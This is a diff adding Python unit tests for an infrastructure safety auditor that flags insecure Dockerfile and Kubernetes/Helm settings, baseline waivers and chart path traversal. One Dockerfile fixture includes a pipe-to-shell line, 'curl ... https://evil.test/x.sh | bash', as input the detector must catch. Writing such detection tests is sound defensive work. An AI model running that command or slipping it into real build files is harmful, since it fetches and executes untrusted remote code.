@@ -1,5 +1,7 @@
 import importlib.util
+import json
 import pathlib
+import tempfile
 import unittest
 
 ROOT = pathlib.Path(__file__).resolve().parents[1]
@@ -151,6 +153,84 @@ class AuditInfraSafetyTests(unittest.TestCase):
         latest_findings = [f for f in findings if f["ruleId"] == "K8S_LATEST_IMAGE_TAG"]
         self.assertEqual(len(latest_findings), 4)
         self.assertEqual([f["line"] for f in latest_findings], [3, 7, 11, 15])
+
+    def test_baseline_count_zero_grants_zero_waivers_and_rejects_invalid_count(self):
+        finding = {
+            "file": "helm/a.yaml",
+            "line": 1,
+            "ruleId": "K8S_INSECURE_TLS_CONNSTRING",
+            "fingerprint": "x",
+            "message": "m",
+        }
+        baselined, unapproved = audit_infra_safety.apply_baseline([finding], [{**finding, "count": 0}])
+        self.assertEqual(baselined, [])
+        self.assertEqual(len(unapproved), 1)
+        for bad_count in ("999", -1, 1.5, False):
+            with self.subTest(bad_count=bad_count):
+                with self.assertRaises(ValueError):
+                    audit_infra_safety.apply_baseline([finding], [{**finding, "count": bad_count}])
+
+    def test_dockerfile_catches_uid_gid_root_and_run_heredoc_bypasses(self):
+        digest = "a" * 64
+        for user_spec in ("root:root", "0:0", "0000:1000"):
+            with self.subTest(user_spec=user_spec):
+                df = f"FROM mcr.microsoft.com/dotnet/aspnet:10.0@sha256:{digest}\nUSER {user_spec}\n"
+                rules = {f["ruleId"] for f in audit_infra_safety.check_dockerfile_content(df, "Dockerfile", require_pinned_digest=True)}
+                self.assertIn("DOCKERFILE_ROOT_USER", rules)
+
+        heredoc_bad = (
+            f"FROM mcr.microsoft.com/dotnet/aspnet:10.0@sha256:{digest}\n"
+            "RUN <<EOF\n"
+            "chmod 777 /app\n"
+            "curl -sSL https://evil.test/x.sh | bash\n"
+            "EOF\n"
+            "USER 10001:10001\n"
+        )
+        rules_hd = {f["ruleId"] for f in audit_infra_safety.check_dockerfile_content(heredoc_bad, "Dockerfile", require_pinned_digest=True)}
+        self.assertTrue({"DOCKERFILE_CHMOD_777", "DOCKERFILE_PIPE_TO_SHELL"} <= rules_hd, rules_hd)
+
+        heredoc_clean = (
+            f"FROM mcr.microsoft.com/dotnet/aspnet:10.0@sha256:{digest}\n"
+            "RUN <<-SCRIPT\n"
+            "\t# chmod 777 /ignored-comment\n"
+            "\techo ok\n"
+            "\tSCRIPT\n"
+            "USER 10001:10001\n"
+        )
+        self.assertEqual(audit_infra_safety.check_dockerfile_content(heredoc_clean, "Dockerfile", require_pinned_digest=True), [])
+
+    def test_k8s_catches_tls_colon_ssl_mode_latest_digest_tpl_and_rejects_traversal(self):
+        digest = "b" * 64
+        k8s_bad = (
+            "apiVersion: apps/v1\nkind: Deployment\nspec:\n  template:\n    spec:\n      containers:\n"
+            f"        - name: app\n          image: ghcr.io/org/app:latest@sha256:{digest}\n"
+            "          securityContext:\n            readOnlyRootFilesystem: true\n"
+            "          env:\n            - name: C1\n              value: \"Ssl Mode=Disable\"\n"
+            "            - name: C2\n              value: \"TrustServerCertificate: true\"\n"
+        )
+        rules = [f["ruleId"] for f in audit_infra_safety.check_k8s_helm_content(k8s_bad, "helm/app/templates/dep.yaml")]
+        self.assertIn("K8S_LATEST_IMAGE_TAG", rules)
+        self.assertEqual(rules.count("K8S_INSECURE_TLS_CONNSTRING"), 2)
+
+        with tempfile.TemporaryDirectory() as tmp:
+            root = pathlib.Path(tmp) / "repo"
+            outside = pathlib.Path(tmp) / "outside"
+            (root / "helm" / "app" / "templates").mkdir(parents=True)
+            outside.mkdir(parents=True)
+            (outside / "Chart.yaml").write_text("apiVersion: v2\nname: out\n", encoding="utf-8")
+            tpl = root / "helm" / "app" / "templates" / "_helpers.tpl"
+            tpl.write_text('{{- define "app.conn" -}}Host=db;Trust Server Certificate=true{{- end -}}\n', encoding="utf-8")
+
+            rc_tpl = audit_infra_safety.main(["--repo-root", str(root), "--no-dockerfile", "--check-k8s-helm"])
+            self.assertEqual(rc_tpl, 1)
+
+            rc_outside = audit_infra_safety.main(["--repo-root", str(root), "--no-dockerfile", "--check-k8s-helm", "--helm-chart-dir", "../outside"])
+            self.assertEqual(rc_outside, 1)
+
+            baseline = root / "infra-baseline.json"
+            baseline.write_text(json.dumps({"infra_safety_baseline": [{"file": "helm/app/templates/_helpers.tpl", "ruleId": "K8S_INSECURE_TLS_CONNSTRING", "count": 0}]}), encoding="utf-8")
+            rc_zero = audit_infra_safety.main(["--repo-root", str(root), "--no-dockerfile", "--check-k8s-helm", "--baseline", str(baseline)])
+            self.assertEqual(rc_zero, 1)
 
 
 if __name__ == "__main__":
